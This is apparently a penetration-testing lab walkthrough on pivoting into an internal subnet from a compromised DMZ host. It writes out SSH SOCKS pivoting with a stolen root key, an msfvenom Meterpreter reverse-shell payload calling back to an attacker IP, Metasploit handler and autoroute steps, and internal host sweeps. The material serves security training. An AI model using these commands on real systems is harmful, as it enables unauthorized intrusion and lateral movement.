# Internal Information Gathering

We've covered a ton of ground so far:

* Performed external information gathering
* Performed external port and service scanning
* Enumerated multiple services for misconfigurations and known vulnerabilities
* Enumerated and attacked 12 different web applications, with some resulting in no access, others granting file read or sensitive data access, and a few resulting in remote code execution on the underlying web server
* Obtained a hard-fought foothold in the internal network
* Performed pillaging and lateral movement to gain access as a more privileged user
* Escalated privileges to root on the web server
* Established persistence through the use of both a user/password pair and the root account's private key for fast SSH access back into the environment

## Setting Up Pivoting - SSH

With a copy of the root `id_rsa` (private key) file, we can use SSH port forwarding along with [ProxyChains](https://github.com/haad/proxychains) to start getting a picture of the internal network. To review this technique, check out the [Dynamic Port Forwarding with SSH and SOCKS Tunneling](https://academy.hackthebox.com/module/158/section/1426) section of the `Pivoting, Tunneling, and Port Forwarding` module.

We can use the following command to set up our SSH pivot using dynamic port forwarding: `ssh -D 8081 -i dmz01_key root@10.129.x.x`. This means we can proxy traffic from our attack host through port 8081 on the target to reach hosts inside the 172.16.8.0/23 subnet directly from our attack host.

In our first terminal, let's set up the SSH dynamic port forwarding command first:

```shell-session
$ ssh -D 8081 -i dmz01_key root@10.129.203.111

We can confirm that the dynamic port forward is set up using `Netstat` or running an Nmap scan against our localhost address.

```shell-session
$ netstat -antp | grep 8081

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      122808/ssh          
tcp6       0      0 ::1:8081
```

Next, we need to modify the `/etc/proxychains.conf` to use the port we specified with our dynamic port forwarding command (8081 here).

{% hint style="info" %}
**Note:** If you are working from the Pwnbox, be sure to save this private key down to your notes or a local file or you'll have to re-do all steps to get back to this point should you decide to pause for a while.
{% endhint %}

```shell-session
$ grep socks4 /etc/proxychains.conf 

#	 	socks4	192.168.1.49	1080
#       proxy types: http, socks4, socks5
socks4 	127.0.0.1 8081
```

Next, we can use Nmap with Proxychains to scan the dmz01 host on its' second NIC, with the IP address `172.16.8.120` to ensure everything is set up correctly.

```shell-session
$ proxychains nmap -sT -p 21,22,80,8080 172.16.8.120

## Setting Up Pivoting - Metasploit

Alternatively, we can set up our pivoting using Metasploit, as covered in the [Meterpreter Tunneling & Port Forwarding](https://academy.hackthebox.com/module/158/section/1428) section of the Pivoting module. To achieve this, we can do the following:

First, generate a reverse shell in Elf format using `msfvenom`.

```shell-session
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
```

Next, transfer the host to the target. Since we have SSH, we can upload it to the target using SCP.

```shell-session
$ scp -i dmz01_key shell.elf root@10.129.203.111:/tmp

shell.elf                                                                      100%  207     1.6KB/s   00:00
```

Now, we'll set up the Metasploit `exploit/multi/handler`.

```shell-session
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.10.14.15 
lhost => 10.10.14.15
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 443
LPORT => 443
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.14.15:443
```

Execute the `shell.elf` file on the target system:

```shell-session
root@dmz01:/tmp# chmod +x shell.elf 
root@dmz01:/tmp# ./shell.elf 
```

If all goes as planned, we'll catch the Meterpreter shell using the multi/handler, and then we can set up routes.

```shell-session
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.14.15:443 
[*] Sending stage (989032 bytes) to 10.129.203.111
[*] Meterpreter session 1 opened (10.10.14.15:443 -> 10.129.203.111:58462 ) at 2022-06-21 21:28:43 -0400

(Meterpreter 1)(/tmp) > getuid
Server username: root
```

Next, we can set up routing using the `post/multi/manage/autoroute` module.

```shell-session
(Meterpreter 1)(/tmp) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute 
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> show options

## Host Discovery - 172.16.8.0/23 Subnet - Metasploit

Once both options are set up, we can begin hunting for live hosts. Using our Meterpreter session, we can use the `multi/gather/ping_sweep` module to perform a ping sweep of the `172.16.8.0/23` subnet.

```shell-session
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use post/multi/gather/ping_sweep
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> show options 

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       IP Range to perform ping sweep against.
   SESSION                   yes       The session to run this module on

[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set rhosts 172.16.8.0/23
rhosts => 172.16.8.0/23
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> run

[*] Performing ping sweep for IP range 172.16.8.0/23

[+] 	172.16.8.20 host found
[+] 	172.16.8.50 host found
[+] 	172.16.8.120 host found
```

***

## Host Discovery - 172.16.8.0/23 Subnet - SSH Tunnel

Alternatively, we could do a ping sweep or use a [static Nmap binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) from the dmz01 host.

We get quick results with this Bash one-liner ping sweep:

```shell-session
root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from

64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=0.472 ms
64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.433 ms
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.642 ms
```

We could also use Nmap through Proxychains to enumerate hosts in the 172.16.8.0/23 subnet, but it will be very slow and take ages to finish.

Our host discovery yields three additional hosts:

* 172.16.8.3
* 172.16.8.20
* 172.16.8.50

We can now dig deeper into each of these hosts and see what we turn up.

***

## Host Enumeration

Let's continue our enumeration using a static Nmap binary from the dmz01 host. Try uploading the binary using one of the techniques taught in the [File Transfers](https://academy.hackthebox.com/module/24/section/159) module.

```shell-session
root@dmz01:/tmp# ./nmap --open -iL live_hosts 

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-06-22 01:42 UTC

Nmap done: 3 IP addresses (3 hosts up) scanned in 131.36 second
```

From the Nmap output, we can gather the following:

* 172.16.8.3 is a Domain Controller because we see open ports such as Kerberos and LDAP. We can likely leave this to the side for now as its unlikely to be directly exploitable (though we can come back to that)
* 172.16.8.20 is a Windows host, and the ports `80/HTTP` and `2049/NFS` are particularly interesting
* 172.16.8.50 is a Windows host as well, and port `8080` sticks out as non-standard and interesting

We could run a full TCP port scan in the background while digging into some of these hosts.
